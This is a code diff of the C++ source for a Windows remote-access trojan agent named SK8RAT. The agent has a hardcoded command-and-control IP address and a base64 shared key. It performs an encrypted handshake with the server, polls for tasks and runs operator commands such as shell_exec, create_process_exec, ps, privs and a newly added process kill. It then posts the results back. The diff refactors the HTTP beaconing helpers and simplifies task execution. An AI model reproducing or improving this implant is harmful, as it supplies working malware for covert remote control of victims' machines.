@@ -14,235 +14,18 @@ using json = nlohmann::json;
 
 // Global variables: ip/hostname, port, stage0 uri, stage1 uri, stage2 uri, stage3 uri, beacon uri
 // listener_id, symetric key, sleep, jitter
-std::string server_ip = "192.168.128.40";
+std::string server_ip = "172.20.0.180";
 int server_port = 443;
 std::string stage0_uri = "/stage0";
 std::string stage1_uri = "/stage1";
 std::string stage2_uri = "/stage2";
 std::string stage3_uri = "/stage3";
-std::string beacon_uri = "/beaconing";
-std::string sharedkey_b64 = "MaxOvmsitfgWLk/fAXLWyEGbTgt8vlEsM3a5ztvIsFo=";
+std::string get_uri = "/get";
+std::string post_uri = "/post";
+std::string sharedkey_b64 = "NI83CfT9KnXiK3OFTNKyXybAVF7lmYOmERBsCuIXnVE=";
 int listener_id = 1;
 int sleep = 5;
 int jitter = 10;
-
-std::string agent_get(std::string domain, int port, std::string url, std::string &response)
-{
-	std::wstring wstrDomain = GetUTF16(domain, CP_UTF8);
-	std::wstring wstrUrl = GetUTF16(url, CP_UTF8);
-	std::string agent_return;
-
-	DWORD dwSize = 0;
-	DWORD dwDownloaded = 0;
-	LPSTR pszOutBuffer;
-	BOOL  bResults = FALSE;
-	HINTERNET  hSession = NULL,
-		hConnect = NULL,
-		hRequest = NULL;
-
-	// Use WinHttpOpen to obtain a session handle.
-	hSession = WinHttpOpen(L"WinHTTP Example/1.0",
-		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
-		WINHTTP_NO_PROXY_NAME,
-		WINHTTP_NO_PROXY_BYPASS, 0);
-
-	// Specify an HTTP server.
-	if (hSession)
-		hConnect = WinHttpConnect(hSession, wstrDomain.c_str() ,
-			port, 0);
-
-	// Create an HTTP request handle.
-	if (hConnect)
-		hRequest = WinHttpOpenRequest(hConnect, L"GET", wstrUrl.c_str(),
-			NULL, WINHTTP_NO_REFERER,
-			WINHTTP_DEFAULT_ACCEPT_TYPES,
-			NULL);
-
-	// Send a request.
-	if (hRequest)
-		bResults = WinHttpSendRequest(hRequest,
-			WINHTTP_NO_ADDITIONAL_HEADERS, 0,
-			WINHTTP_NO_REQUEST_DATA, 0,
-			0, 0);
-	//printf("Sending GET to server ...\n");
-
-	// End the request.
-	if (bResults)
-		bResults = WinHttpReceiveResponse(hRequest, NULL);
-
-	// Keep checking for data until there is nothing left.
-	if (bResults)
-	{
-		do
-		{
-			// Check for available data.
-			dwSize = 0;
-			if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
-			{
-				printf("Error %u in WinHttpQueryDataAvailable.\n",
-					GetLastError());
-				break;
-			}
-
-			// No more available data.
-			if (!dwSize)
-				break;
-
-			// Allocate space for the buffer.
-			pszOutBuffer = new char[dwSize + 1];
-			if (!pszOutBuffer)
-			{
-				printf("Out of memory\n");
-				break;
-			}
-
-			// Read the Data.
-			ZeroMemory(pszOutBuffer, dwSize + 1);
-
-			if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
-				dwSize, &dwDownloaded))
-			{
-				printf("Error %u in WinHttpReadData.\n", GetLastError());
-			}
-			else
-			{
-				//printf("Server Response: %s\n", pszOutBuffer);
-				std::string stdstr = pszOutBuffer;
-				response = stdstr;
-			}
-
-			// Free the memory allocated to the buffer.
-			delete[] pszOutBuffer;
-
-			// This condition should never be reached since WinHttpQueryDataAvailable
-			// reported that there are bits to read.
-			if (!dwDownloaded)
-				break;
-
-		} while (dwSize > 0);
-	}
-	else
-	{
-		// Report any errors.
-		printf("Error %d has occurred.\n", GetLastError());
-	}
-
-	// Close any open handles.
-	if (hRequest) WinHttpCloseHandle(hRequest);
-	if (hConnect) WinHttpCloseHandle(hConnect);
-	if (hSession) WinHttpCloseHandle(hSession);
-	return agent_return;
-}
-
-void agent_post(std::string domain, int port, std::string url, std::string send, std::string &response)
-{
-	std::wstring wstrDomain = GetUTF16(domain, CP_UTF8);
-	std::wstring wstrUrl = GetUTF16(url, CP_UTF8);
-	std::string agent_return;
-
-	DWORD dwSize = 0;
-	DWORD dwDownloaded = 0;
-	LPSTR pszOutBuffer;
-	BOOL  bResults = FALSE;
-	HINTERNET  hSession = NULL,
-		hConnect = NULL,
-		hRequest = NULL;
-
-	// Use WinHttpOpen to obtain a session handle.
-	hSession = WinHttpOpen(L"WinHTTP Example/1.0",
-		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
-		WINHTTP_NO_PROXY_NAME,
-		WINHTTP_NO_PROXY_BYPASS, 0);
-
-	// Specify an HTTP server.
-	if (hSession)
-		hConnect = WinHttpConnect(hSession, wstrDomain.c_str(),
-			port, 0);
-
-	// Create an HTTP request handle.
-	if (hConnect)
-		hRequest = WinHttpOpenRequest(hConnect, L"POST", wstrUrl.c_str(),
-			NULL, WINHTTP_NO_REFERER,
-			WINHTTP_DEFAULT_ACCEPT_TYPES,
-			NULL);
-
-	// Send a request.
-	LPSTR  data = const_cast<char *>(send.c_str());;
-	DWORD data_len = strlen(data);
-	DWORD headersLength = -1;
-	if (hRequest)
-		bResults = WinHttpSendRequest(hRequest,
-			WINHTTP_NO_ADDITIONAL_HEADERS, headersLength,
-			data, data_len,
-			data_len, 0);
-	//printf("Sending POST to server ...\n");
-
-	// End the request.
-	if (bResults)
-		bResults = WinHttpReceiveResponse(hRequest, NULL);
-
-	// Keep checking for data until there is nothing left.
-	if (bResults)
-	{
-		do
-		{
-			// Check for available data.
-			dwSize = 0;
-			if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
-			{
-				printf("Error %u in WinHttpQueryDataAvailable.\n",
-					GetLastError());
-				break;
-			}
-
-			// No more available data.
-			if (!dwSize)
-				break;
-
-			// Allocate space for the buffer.
-			pszOutBuffer = new char[dwSize + 1];
-			if (!pszOutBuffer)
-			{
-				printf("Out of memory\n");
-				break;
-			}
-
-			// Read the Data.
-			ZeroMemory(pszOutBuffer, dwSize + 1);
-
-			if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
-				dwSize, &dwDownloaded))
-			{
-				printf("Error %u in WinHttpReadData.\n", GetLastError());
-			}
-			else
-			{
-				//printf("Server response: %s\n", pszOutBuffer);
-				std::string stdstr = pszOutBuffer;
-				response = stdstr;
-			}
-
-			// Free the memory allocated to the buffer.
-			delete[] pszOutBuffer;
-
-			// This condition should never be reached since WinHttpQueryDataAvailable
-			// reported that there are bits to read.
-			if (!dwDownloaded)
-				break;
-
-		} while (dwSize > 0);
-	}
-	else
-	{
-		// Report any errors.
-		printf("Error %d has occurred.\n", GetLastError());
-	}
-
-	// Close any open handles.
-	if (hRequest) WinHttpCloseHandle(hRequest);
-	if (hConnect) WinHttpCloseHandle(hConnect);
-	if (hSession) WinHttpCloseHandle(hSession);
-}
 
 std::string agent_get_cookie(std::string domain, int port, std::string url, std::string cookie, std::string &response)
 {
@@ -276,17 +59,27 @@ std::string agent_get_cookie(std::string domain, int port, std::string url, std:
 			WINHTTP_DEFAULT_ACCEPT_TYPES,
 			NULL);
 
-	// Send a request.
-	std::string headers = "Cookie: macaroon=" + cookie;
-	std::wstring wheaders = GetUTF16(headers, CP_UTF8);
-	LPCWSTR lpcwheaders = wheaders.c_str();
-	DWORD headersLength = wcslen(lpcwheaders);
-	if (hRequest)
-		bResults = WinHttpSendRequest(hRequest,
-			lpcwheaders, headersLength,
-			WINHTTP_NO_REQUEST_DATA, 0,
-			0, 0);
-	//printf("Sending GET to server ...\n");
+	// Send a request, check for cookie
+	if (cookie != "")
+	{
+		std::string headers = "Cookie: macaroon=" + cookie;
+		std::wstring wheaders = GetUTF16(headers, CP_UTF8);
+		LPCWSTR lpcwheaders = wheaders.c_str();
+		DWORD headersLength = wcslen(lpcwheaders);
+		if (hRequest)
+			bResults = WinHttpSendRequest(hRequest,
+				lpcwheaders, headersLength,
+				WINHTTP_NO_REQUEST_DATA, 0,
+				0, 0);
+	}
+	else
+	{
+		if (hRequest)
+			bResults = WinHttpSendRequest(hRequest,
+				WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+				WINHTTP_NO_REQUEST_DATA, 0,
+				0, 0);
+	}
 
 	// End the request.
 	if (bResults)
@@ -391,18 +184,30 @@ void agent_post_cookie(std::string domain, int port, std::string url, std::strin
 	// Send a request.
 	LPSTR  data = const_cast<char *>(send.c_str());;
 	DWORD data_len = strlen(data);
-	std::string headers = "Cookie: macaroon=" + cookie;
-	std::wstring wheaders = GetUTF16(headers, CP_UTF8);
-	LPCWSTR lpcwheaders = wheaders.c_str();
-	DWORD headersLength = wcslen(lpcwheaders);
-	//printf("%s\n%S\n%S\nheader length: %i\n", headers.c_str(), wheaders.c_str(), lpcwheaders, headersLength);
-	if (hRequest)
-		bResults = WinHttpSendRequest(hRequest,
-			lpcwheaders, headersLength,
-			data, data_len,
-			data_len, 0);
-	//printf("Sending POST to server ...\n");
 
+	// Check for cookie
+	if (cookie != "")
+	{
+		std::string headers = "Cookie: macaroon=" + cookie;
+		std::wstring wheaders = GetUTF16(headers, CP_UTF8);
+		LPCWSTR lpcwheaders = wheaders.c_str();
+		DWORD headersLength = wcslen(lpcwheaders);
+		if (hRequest)
+			bResults = WinHttpSendRequest(hRequest,
+				lpcwheaders, headersLength,
+				data, data_len,
+				data_len, 0);
+	}
+	else
+	{
+		DWORD headersLength = -1;
+		if (hRequest)
+			bResults = WinHttpSendRequest(hRequest,
+				WINHTTP_NO_ADDITIONAL_HEADERS, headersLength,
+				data, data_len,
+				data_len, 0);
+	}
+	
 	// End the request.
 	if (bResults)
 		bResults = WinHttpReceiveResponse(hRequest, NULL);
@@ -472,7 +277,7 @@ void agent_post_cookie(std::string domain, int port, std::string url, std::strin
 
 void SK8RAT_EKE(unsigned char symmetrickey[32], std::string &sessioncookie)
 {
-	// Generate shared symetric key (don't think I need to hardcode this)
+	// Get hardcoded shared key)
 	unsigned char sharedkey[crypto_secretbox_KEYBYTES];
 	std::string sharedkey_decoded = base64_decode(sharedkey_b64);
 	memcpy(sharedkey, sharedkey_decoded.c_str(), 32);
@@ -508,7 +313,7 @@ void SK8RAT_EKE(unsigned char symmetrickey[32], std::string &sessioncookie)
 
 	// Send to server, obtain response
 	std::string server_response = "";
-	agent_post(server_ip, server_port, stage0_uri, send_stage0, server_response);
+	agent_post_cookie(server_ip, server_port, stage0_uri, "", send_stage0, server_response);
 
 	// Clean " at beginning and end bc flask ... also cleans \n
 	if (server_response.at(0) == '"')
@@ -546,7 +351,7 @@ void SK8RAT_EKE(unsigned char symmetrickey[32], std::string &sessioncookie)
 
 	//POST challenge response to /stage1
 	std::string server_response2 = "";
-	agent_post(server_ip, server_port, stage1_uri, send_stage1, server_response2);
+	agent_post_cookie(server_ip, server_port, stage1_uri, "", send_stage1, server_response2);
 
 	// Clean " at beginning and end bc flask ... also cleans \n
 	if (server_response2.at(0) == '"')
@@ -598,7 +403,7 @@ void SK8RAT_EKE(unsigned char symmetrickey[32], std::string &sessioncookie)
 
 	// POST K[server_challenge] to /stage2
 	std::string server_response3 = "";
-	agent_post(server_ip, server_port, stage2_uri, send_stage2, server_response3);
+	agent_post_cookie(server_ip, server_port, stage2_uri, "", send_stage2, server_response3);
 
 	// If server response is 0, exit
 	if (server_response3 == "0\n")
@@ -692,7 +497,7 @@ void SK8RAT_EKE(unsigned char symmetrickey[32], std::string &sessioncookie)
 void SK8RAT_tasking(unsigned char * symmetrickey, std::string sessioncookie)
 {
 	std::string encrypted_tasking = "";
-	agent_get_cookie(server_ip, server_port, beacon_uri, sessioncookie, encrypted_tasking);
+	agent_get_cookie(server_ip, server_port, get_uri, sessioncookie, encrypted_tasking);
 
 	// Clean " at beginning and end bc flask ... also cleans \n
 	if (encrypted_tasking.at(0) == '"')
@@ -765,7 +570,7 @@ void SK8RAT_tasking(unsigned char * symmetrickey, std::string sessioncookie)
 			cd(path);
 			j["task_output"][i] = "no output";
 			j["task_status"][i] = "complete";
-			printf("Performing cd to %s\n", path.c_str());
+			printf("Task %i received, performing cd to %s\n", i, path.c_str());
 		}
 		if (temp.substr(0, 2) == "cp")
 		{
@@ -799,7 +604,7 @@ void SK8RAT_tasking(unsigned char * symmetrickey, std::string sessioncookie)
 			cp(src_file, dest_file);
 			j["task_output"][i] = "no output";
 			j["task_status"][i] = "complete";
-			printf("Performing cp %s %s\n", src_file.c_str(), dest_file.c_str());
+			printf("Task %i received, performing cp %s %s\n", i, src_file.c_str(), dest_file.c_str());
 		}
 		if (temp.substr(0, 2) == "mv")
 		{
@@ -833,103 +638,75 @@ void SK8RAT_tasking(unsigned char * symmetrickey, std::string sessioncookie)
 			mv(src_file, dest_file);
 			j["task_output"][i] = "no output";
 			j["task_status"][i] = "complete";
-			printf("Performing mv %s %s\n", src_file.c_str(), dest_file.c_str());
+			printf("Task %i received, performing mv %s %s\n", i, src_file.c_str(), dest_file.c_str());
 		}
 		if (temp == "whoami")
 		{
-			// Initialize structure on the heap
-			createthread_in *ct_whoami_in = new createthread_in(); //DELETE THIS IN THREAD
-			ct_whoami_in->j = &j;
-			ct_whoami_in->counter = i;
-			ct_whoami_in->input = "";
+			// Perform pwd and stuff into json blob
+			j["task_output"][i] = whoami();
+			j["task_status"][i] = "complete";
 
-			// Create thread to perform task and write task output to json at [i]
-			CreateThread(0, 0, whoami_thread, ct_whoami_in, 0, 0);
-
-			printf("Using CreateThread() to run whoami! ... Task Index: %i\n", i);
+			printf("Task %i received, performing whoami\n", i);
 		}
 		if (temp == "pwd")
 		{
-			// Initialize structure on the heap
-			createthread_in *ct_pwd_in = new createthread_in(); //DELETE THIS IN THREAD
-			ct_pwd_in->j = &j;
-			ct_pwd_in->counter = i;
-			ct_pwd_in->input = "";
+			// Perform pwd and stuff into json blob
+			j["task_output"][i] = pwd();
+			j["task_status"][i] = "complete";
 
-			// Create thread to perform task and write task output to json at [i]
-			CreateThread(0, 0, pwd_thread, ct_pwd_in, 0, 0);
-
-			printf("Using CreateThread() to run pwd! ... Task Index: %i\n", i);
+			printf("Task %i received, performing pwd\n", i);
 		}
 		if (temp == "drives")
 		{
-			// Initialize structure on the heap
-			createthread_in *ct_drives_in = new createthread_in(); //DELETE THIS IN THREAD
-			ct_drives_in->j = &j;
-			ct_drives_in->counter = i;
-			ct_drives_in->input = "";
+			// Perform drives and stuff into json blob
+			j["task_output"][i] = drives();
+			j["task_status"][i] = "complete";
 
-			// Create thread to perform task and write task output to json at [i]
-			CreateThread(0, 0, drives_thread, ct_drives_in, 0, 0);
-
-			printf("Using CreateThread() to run drives! ... Task Index: %i\n", i);
+			printf("Task %i received, performing drives\n", i);
 		}
 		if (temp == "ps")
 		{
-			// Initialize structure on the heap
-			createthread_in *ct_ps_in = new createthread_in(); //DELETE THIS IN THREAD
-			ct_ps_in->j = &j;
-			ct_ps_in->counter = i;
-			ct_ps_in->input = "";
+			// Perform ps and stuff into json blob
+			j["task_output"][i] = ps();
+			j["task_status"][i] = "complete";
 
-			// Create thread to perform task and write task output to json at [i]
-			CreateThread(0, 0, ps_thread, ct_ps_in, 0, 0);
-			printf("Using CreateThread() to run ps! ... Task Index: %i\n", i);
+			printf("Task %i received, performing ps\n", i);
 		}
 		if (temp == "privs")
 		{
-			// Initialize structure on the heap
-			createthread_in *ct_privs_in = new createthread_in(); //DELETE THIS IN THREAD
-			ct_privs_in->j = &j;
-			ct_privs_in->counter = i;
-			ct_privs_in->input = "";
+			// Perform privs and stuff into json blob
+			j["task_output"][i] = privs();
+			j["task_status"][i] = "complete";
 
-			// Create thread to perform task and write task output to json at [i]
-			CreateThread(0, 0, privs_thread, ct_privs_in, 0, 0);
-			printf("Using CreateThread() to run privs! ... Task Index: %i\n", i);
+			printf("Task %i received, performing privs\n", i);
 		}
 		if (temp.substr(0, 2) == "ls")
 		{
-			// Initialize structure on the heap
-			createthread_in *ct_ls_in = new createthread_in(); //DELETE THIS IN THREAD
-			ct_ls_in->j = &j;
-			ct_ls_in->counter = i;
+			std::string path = "";
 
 			// Check for blank path, if path is blank we will ls current dir
 			if (temp == "ls")
 			{
-				ct_ls_in->input = "";
+				path = "";
 			}
 			else
 			{
-				ct_ls_in->input = temp.substr(temp.find(" ") + 1);
+				path = temp.substr(temp.find(" ") + 1);
 			}
 
-			// Create thread to perform task and write task output to json at [i]
-			CreateThread(0, 0, ls_thread, ct_ls_in, 0, 0);
-			printf("Using CreateThread() to run 'ls %s'! ... Task Index: %i\n", (ct_ls_in->input).c_str(), i);
+			// Perform ls and stuff into json blob
+			j["task_output"][i] = ls(path);
+			j["task_status"][i] = "complete";
+			printf("Task %i received, performing ls %s\n", i, path.c_str());
 		}
 		if (temp.substr(0, 10) == "shell_exec")
 		{
-			// Initialize structure on the heap
-			createthread_in *ct_shell_exec_in = new createthread_in(); //DELETE THIS IN THREAD
-			ct_shell_exec_in->j = &j;
-			ct_shell_exec_in->counter = i;
-			ct_shell_exec_in->input = temp.substr(temp.find(" ") + 1);
+			std::string path = temp.substr(temp.find(" ") + 1);
 
-			// Create thread to perform task and write task output to json at [i]
-			CreateThread(0, 0, shell_exec_thread, ct_shell_exec_in, 0, 0);
-			printf("Using CreateThread() to run 'shell_exec %s'! ... Task Index: %i\n", (ct_shell_exec_in->input).c_str(), i);
+			// Perform shell_exec and stuff into json blob
+			j["task_output"][i] = shell_exec(path);
+			j["task_status"][i] = "complete";
+			printf("Task %i received, performing shell_exec %s\n", i, path.c_str());
 		}
 		if (temp.substr(0, 19) == "create_process_exec")
 		{
@@ -943,10 +720,21 @@ void SK8RAT_tasking(unsigned char * symmetrickey, std::string sessioncookie)
 			CreateThread(0, 0, create_process_exec_thread, ct_create_process_exec_in, 0, 0);
 			printf("Using CreateThread() to run 'create_process_exec %s'! ... Task Index: %i\n", (ct_create_process_exec_in->input).c_str(), i);
 		}
+		if (temp.substr(0, 4) == "kill")
+		{
+			// Save pid as string, convert to int
+			std::string pid_s = temp.substr(temp.find(" ") + 1);
+			int pid = std::stoi(pid_s);
+
+			// Perform kill and stuff into json blob
+			j["task_output"][i] = kill_process(pid);
+			j["task_status"][i] = "complete";
+			printf("Task %i received, performing kill %i\n", i, pid);
+		}
 	}
 
 	// Pause this thread to allow threads to complete, need to figure out how to do this smarter
-	// This is literally so fucking dumb right now
+	// This is literally so dumb, long running jobs will break this architecture
 	Sleep(3000);
 
 	// Update last_seen
@@ -973,7 +761,7 @@ void SK8RAT_tasking(unsigned char * symmetrickey, std::string sessioncookie)
 
 	// POST K[sk8rat_checkin] to /beaconing
 	std::string server_response2 = "";
-	agent_post_cookie(server_ip, server_port, beacon_uri, sessioncookie, send_response, server_response2);
+	agent_post_cookie(server_ip, server_port, post_uri, sessioncookie, send_response, server_response2);
 
 	// Clean-up dynamically allocated memory
 	delete(server_response);
